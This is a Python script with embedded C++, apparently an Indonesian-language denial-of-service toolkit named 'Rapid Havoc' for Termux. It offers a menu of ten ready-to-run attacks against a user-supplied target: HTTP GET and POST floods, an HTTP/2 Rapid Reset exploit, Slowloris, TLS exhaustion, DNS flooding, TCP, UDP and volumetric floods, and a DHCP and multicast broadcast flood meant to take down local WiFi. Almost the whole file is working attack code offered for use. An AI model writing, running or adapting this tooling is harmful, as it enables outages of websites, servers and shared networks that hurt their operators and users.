#!/usr/bin/env python3
# language: Python 3.8+ | embedded: C++17
# file: rapid_havoc.py
# 10 Vektor Super Cepat (L7 Web & L4 LAN). Tanpa Root. Tanpa Simulasi.
# Termux: pkg install python clang

import os, sys, time, socket, ssl, random, string, threading, urllib.parse, subprocess, shutil, re

# ── WARNA HIJAU NEON ──
G1  = "\033[38;5;46m"   
G2  = "\033[38;5;118m"  
W   = "\033[97m" 
R   = "\033[91m" 
Y   = "\033[93m" 
D   = "\033[90m" 
RST = "\033[0m"

def clr():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""{G1}
╔══════════════════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ██████╗ ██╗██████╗     ██╗  ██╗ █████╗ ██╗   ██╗ ██████╗ 
║  ██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗    ██║  ██║██╔══██╗██║   ██║██╔═══██╗
║  ██████╔╝███████║██████╔╝██║██║  ██║    ███████║███████║██║   ██║██║   ██║
║  ██╔══██╗██╔══██║██╔═══╝ ██║██║  ██║    ██╔══██║██╔══██║╚██╗ ██╔╝██║   ██║
║  ██║  ██║██║  ██║██║     ██║██████╔╝    ██║  ██║██║  ██║ ╚████╔╝ ╚██████╔╝
║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝   ╚═════╝ 
║                                                                          
║      {G2}1 0   V E K T O R   ·   H I G H - S P E E D   ·   R E A L{RST}{G1}
╚══════════════════════════════════════════════════════════════════════════╝{RST}
""")

def ask(p, d=None, k=str):
    suf = f" {D}[{d}]{RST}" if d is not None else ""
    while True:
        try: s = input(f"  {G1}»{RST} {W}{p}{RST}{suf}: ").strip()
        except: sys.exit(0)
        if not s and d is not None: return d
        if not s: continue
        try: return k(s)
        except: print(f"  {R}Format salah.{RST}")

def get_local_info():
    local = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); local = s.getsockname()[0]; s.close()
    except: pass
    gw = "192.168.1.1"
    try:
        out = subprocess.check_output(["ip","route"], text=True)
        m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
        if m: gw = m.group(1)
    except: pass
    return local, gw

# ═══════════════════════ C++ ENGINE (L4 & LAN) ═══════════════════════
CPP = r"""
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <errno.h>
#include <thread>
#include <atomic>
#include <chrono>
#include <vector>
#include <random>

static std::atomic<bool> RUN{true};
static void sig(int){ RUN.store(false); }

static size_t build_dhcp(char* p, size_t cap, std::mt19937& r) {
    if (cap < 300) return 0;
    std::memset(p, 0, 300);
    p[0]=1; p[1]=1; p[2]=6; p[3]=0;
    uint32_t xid = r();
    p[4]=(char)(xid>>24); p[5]=(char)(xid>>16); p[6]=(char)(xid>>8); p[7]=(char)xid;
    p[10]=0x80; p[11]=0x00;
    for (int i=0;i<6;++i) p[28+i] = (char)(r()&0xff);
    size_t o = 236; p[o++]=53; p[o++]=1; p[o++]=1; p[o++]=55; p[o++]=1; p[o++]=1; p[o++]=255;
    return o;
}

static void udp_w(const std::string& ip, int port, long long pps, int size) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s<0) return;
    int snd = 4<<20; setsockopt(s, SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
    sockaddr_in d{}; d.sin_family=AF_INET; d.sin_port=htons(port); inet_pton(AF_INET, ip.c_str(), &d.sin_addr);
    char p[65507]; std::mt19937 r((unsigned)std::chrono::steady_clock::now().time_since_epoch().count());
    for(int i=0;i<size;i+=4) *(int*)&p[i] = r();
    auto per = std::chrono::nanoseconds(pps>0 ? 1000000000LL/pps : 0);
    auto nx = std::chrono::steady_clock::now();
    while (RUN.load()) {
        sendto(s, p, size, 0, (sockaddr*)&d, sizeof(d));
        if (pps>0) { nx += per; std::this_thread::sleep_until(nx); }
    }
    close(s);
}

static void tcp_w(const std::string& ip, int port, long long pps) {
    sockaddr_in d{}; d.sin_family=AF_INET; d.sin_port=htons(port); inet_pton(AF_INET, ip.c_str(), &d.sin_addr);
    auto per = std::chrono::nanoseconds(pps>0 ? 1000000000LL/pps : 0);
    auto nx = std::chrono::steady_clock::now();
    while (RUN.load()) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s>=0){ int f=fcntl(s,F_GETFL,0); fcntl(s,F_SETFL,f|O_NONBLOCK);
                   connect(s,(sockaddr*)&d,sizeof(d)); close(s); }
        if (pps>0){ nx+=per; std::this_thread::sleep_until(nx); }
    }
}

static void dhcp_w(long long pps) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    int one = 1; setsockopt(s, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));
    sockaddr_in d{}; d.sin_family=AF_INET; d.sin_port=htons(67); inet_pton(AF_INET, "255.255.255.255", &d.sin_addr);
    char p[300]; std::mt19937 r((unsigned)std::chrono::steady_clock::now().time_since_epoch().count());
    auto per = std::chrono::nanoseconds(pps>0 ? 1000000000LL/pps : 0);
    auto nx = std::chrono::steady_clock::now();
    while (RUN.load()) {
        size_t n = build_dhcp(p, sizeof(p), r);
        sendto(s, p, n, 0, (sockaddr*)&d, sizeof(d));
        if (pps>0){ nx+=per; std::this_thread::sleep_until(nx); }
    }
}

static void mcast_w(const std::string& lip, long long pps) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    int ttl = 1; setsockopt(s, IPPROTO_IP, IP_MULTICAST_TTL, &ttl, sizeof(ttl));
    sockaddr_in li{}; li.sin_family=AF_INET; inet_pton(AF_INET, lip.c_str(), &li.sin_addr);
    setsockopt(s, IPPROTO_IP, IP_MULTICAST_IF, &li.sin_addr, sizeof(li.sin_addr));
    sockaddr_in d{}; d.sin_family=AF_INET; d.sin_port=htons(5353); inet_pton(AF_INET, "224.0.0.251", &d.sin_addr);
    char p[512]; std::mt19937 r((unsigned)std::chrono::steady_clock::now().time_since_epoch().count());
    auto per = std::chrono::nanoseconds(pps>0 ? 1000000000LL/pps : 0);
    auto nx = std::chrono::steady_clock::now();
    while (RUN.load()) {
        for(int i=0;i<512;i+=4) *(int*)&p[i] = r();
        sendto(s, p, 512, 0, (sockaddr*)&d, sizeof(d));
        if (pps>0){ nx+=per; std::this_thread::sleep_until(nx); }
    }
}

int main(int argc, char** argv) {
    if (argc < 6) return 1;
    signal(SIGTERM, sig); signal(SIGINT, sig);
    std::string mode = argv[1], ip = argv[2];
    int port = atoi(argv[3]), sec = atoi(argv[4]), th = atoi(argv[5]);
    long long pps = argc > 6 ? atoll(argv[6]) : 5000;

    std::vector<std::thread> ts;
    for (int i=0;i<th;++i) {
        if (mode == "udp")      ts.emplace_back(udp_w, ip, port, pps, 1400);
        else if (mode == "tcp") ts.emplace_back(tcp_w, ip, port, pps);
        else if (mode == "dhcp")ts.emplace_back(dhcp_w, pps);
        else if (mode == "mcast")ts.emplace_back(mcast_w, ip, pps);
        else if (mode == "vol") ts.emplace_back(udp_w, ip, port, pps, 65507);
    }
    auto end = std::chrono::steady_clock::now() + std::chrono::seconds(sec);
    while (RUN.load() && std::chrono::steady_clock::now() < end)
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    RUN.store(false);
    for (auto& t:ts) if (t.joinable()) t.join();
    return 0;
}
"""

EBIN = "rapid_engine"
def ensure_eng():
    if os.path.exists(EBIN) and os.access(EBIN, os.X_OK): return True
    cxx = shutil.which("g++") or shutil.which("clang++")
    if not cxx:
        return False
    open("rapid.cpp","w").write(CPP)
    r = subprocess.run([cxx,"-O3","-std=c++17","-pthread","rapid.cpp","-o",EBIN], capture_output=True)
    if r.returncode != 0: return False
    os.chmod(EBIN, 0o755); return True

# ═══════════════════════ PYTHON L7 (SUPER FAST) ═══════════════════════
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

def monitor(secs):
    t0 = time.time()
    try:
        while time.time() - t0 < secs:
            time.sleep(1)
            sys.stdout.write(f"\r  {G2}»{RST} Menembak... {int(time.time()-t0)}/{secs}s   ")
            sys.stdout.flush()
        print()
    except KeyboardInterrupt: pass

def v_slowloris(host, port, is_ssl, secs, th):
    stop = threading.Event()
    sockets = []
    def worker():
        while not stop.is_set():
            if len(sockets) < th:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2); s.connect((host, port))
                    if is_ssl: s = SSL_CTX.wrap_socket(s, server_hostname=host)
                    s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nX-Pad: ".encode())
                    sockets.append(s)
                except: pass
            for s in list(sockets):
                try: s.send(b"a")
                except:
                    try: s.close()
                    except: pass
                    if s in sockets: sockets.remove(s)
            time.sleep(1.5)
    threading.Thread(target=worker, daemon=True).start()
    monitor(secs)
    stop.set()

def v_http_flood(host, port, is_ssl, method, secs, th):
    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5); s.connect((host, port))
                if is_ssl: s = SSL_CTX.wrap_socket(s, server_hostname=host)
                req = f"{method} /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
                s.sendall(req.encode())
                s.close()
            except: pass
    for _ in range(th): threading.Thread(target=worker, daemon=True).start()
    monitor(secs)
    stop.set()

def v_rapid_reset(host, port, secs, th):
    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    headers = b"\x00\x00\x0f\x01\x05\x00\x00\x00\x01\x82\x84\x86\x41\x8a\x08\x9d\x5c\x0b\x81\x70\xdc\x78\x0f\x03"
    rst = b"\x00\x00\x04\x03\x00\x00\x00\x00\x01\x00\x00\x00\x00"
    packet = preface + settings + headers + rst
    stop = threading.Event()
    
    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5); s.connect((host, port))
                if port == 443:
                    s = SSL_CTX.wrap_socket(s, server_hostname=host, alpn_protocols=["h2"])
                s.sendall(packet)
                s.close()
            except: pass
            
    for _ in range(min(th, 100)): threading.Thread(target=worker, daemon=True).start()
    monitor(secs)
    stop.set()

def v_tls_exhaust(host, port, secs, th):
    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5); s.connect((host, port))
                ss = SSL_CTX.wrap_socket(s, server_hostname=host)
                ss.close()
            except: pass
    for _ in range(th): threading.Thread(target=worker, daemon=True).start()
    monitor(secs)
    stop.set()

def v_dns_flood(host, secs, th):
    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                # Nembak port 53 DNS langsung (UDP)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1)
                q = bytearray(random.getrandbits(8) for _ in range(32))
                q[2] = 0x01; q[3] = 0x00; q[4] = 0x00; q[5] = 0x01
                s.sendto(q, (host, 53))
            except: pass
    for _ in range(th): threading.Thread(target=worker, daemon=True).start()
    monitor(secs)
    stop.set()

def run_cpp(mode, ip, port, secs, th, pps=5000):
    if not ensure_eng():
        print(f"\n  {R}[x] Gagal compile C++. Pastikan 'pkg install clang' sudah jalan.{RST}")
        return
    p = subprocess.Popen([f"./{EBIN}", mode, ip, str(port), str(secs), str(th), str(pps)])
    monitor(secs)
    p.terminate()

# ═══════════════════════ MENU ═══════════════════════
def menu():
    local, gw = get_local_info()
    
    while True:
        clr()
        print(f"  {D}IP: {G2}{local}{RST} | GW: {G2}{gw}{RST}")
        print(f"  {G1}╭────────────────────────────────────────────────────╮{RST}")
        print(f"  {G1}│{RST} {W}10 FITUR RAPID HAVOC:{RST}                                {G1}│{RST}")
        print(f"  {G1}╰────────────────────────────────────────────────────╯{RST}")
        print(f"  {G1}[1]{RST}  HTTP GET Rapid Fire (Cepat)")
        print(f"  {G1}[2]{RST}  HTTP POST Rapid Fire (Cepat)")
        print(f"  {G1}[3]{RST}  HTTP/2 Rapid Reset (Eksploit)")
        print(f"  {G1}[4]{RST}  Slowloris (Hang Server)")
        print(f"  {G1}[5]{RST}  TLS Exhaust (Beban CPU)")
        print(f"  {G1}[6]{RST}  DNS Subdomain Flood (Hantam NS)")
        print(f"  {G1}[7]{RST}  TCP Connect Flood (L4)")
        print(f"  {G1}[8]{RST}  UDP Flood (L4)")
        print(f"  {G1}[9]{RST}  Volumetric Max Payload (L4)")
        print(f"  {R}[10]{RST} DHCP + Multicast (Matiin WiFi)")
        print(f"  {G1}[0]{RST}  Keluar")
        print(f"  {G1}──────────────────────────────────────────────────────{RST}")
        
        try: c = input(f"  {G1}»{RST} Pilih [0-10]: ").strip()
        except: break
        
        if c == "0": break
        if c not in [str(i) for i in range(1, 11)]: continue

        if c in ["1", "2", "3", "4", "5", "6"]:
            target = ask("URL Website (contoh: http://target.com)")
            if not target.startswith("http"): target = "http://" + target
            parsed = urllib.parse.urlparse(target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            is_ssl = (parsed.scheme == "https")
            
            secs = ask("Durasi", 60, int)
            th = ask("Thread", 150, int)
            if th > 200: th = 200
            
            print(f"\n  {G2}[*] Memulai tembakan cepat ke {host}:{port}...{RST}")
            if c == "1": v_http_flood(host, port, is_ssl, "GET", secs, th)
            elif c == "2": v_http_flood(host, port, is_ssl, "POST", secs, th)
            elif c == "3": v_rapid_reset(host, port, secs, th)
            elif c == "4": v_slowloris(host, port, is_ssl, secs, th)
            elif c == "5": v_tls_exhaust(host, port, secs, th)
            elif c == "6": v_dns_flood(host, secs, th)
            
        elif c in ["7", "8", "9"]:
            target = ask("IP Target")
            secs = ask("Durasi", 30, int)
            th = ask("Thread", 8, int)
            
            print(f"\n  {G2}[*] Memulai serangan L4 ke {target}...{RST}")
            if c == "7": run_cpp("tcp", target, 80, secs, th, 5000)
            elif c == "8": run_cpp("udp", target, 80, secs, th, 5000)
            elif c == "9": run_cpp("vol", target, 80, secs, th, 2000)
                
        elif c == "10":
            secs = ask("Durasi", 30, int)
            print(f"\n  {G2}[*] Mematikan jaringan lokal (DHCP + Multicast)...{RST}")
            if not ensure_eng():
                print(f"  {R}[x] Gagal compile C++. Ketik: pkg install clang{RST}")
            else:
                p1 = subprocess.Popen([f"./{EBIN}", "dhcp", "255.255.255.255", "67", str(secs), "4", "5000"], stdout=subprocess.DEVNULL)
                p2 = subprocess.Popen([f"./{EBIN}", "mcast", local, "5353", str(secs), "4", "10000"], stdout=subprocess.DEVNULL)
                monitor(secs)
                p1.terminate(); p2.terminate()

        input(f"\n  {D}[Enter untuk kembali]{RST}")

if __name__ == "__main__":
    try: menu()
    except KeyboardInterrupt: print()